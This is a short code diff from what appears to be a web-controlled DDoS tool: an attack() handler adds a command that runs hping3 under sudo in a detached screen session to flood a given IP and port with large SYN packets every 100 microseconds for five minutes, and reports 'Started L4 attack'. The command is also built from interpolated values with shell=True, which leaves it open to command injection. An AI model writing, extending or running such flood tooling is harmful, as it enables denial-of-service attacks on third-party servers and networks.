@@ -48,6 +48,8 @@ def attack():
     try:
         # 执行命令
         subprocess.Popen(command, shell=True)
+        command = f"screen -S {session_name} -dm bash -c 'sudo timeout 300s hping3 -q -S {ip} -p {port} -i u100 -d 8192'"
+        subprocess.Popen(command, shell=True)
         return f"Started L4 attack on {ip}:{port} with session {session_name}", 200
     except Exception as e:
         return f"Error: {str(e)}", 500
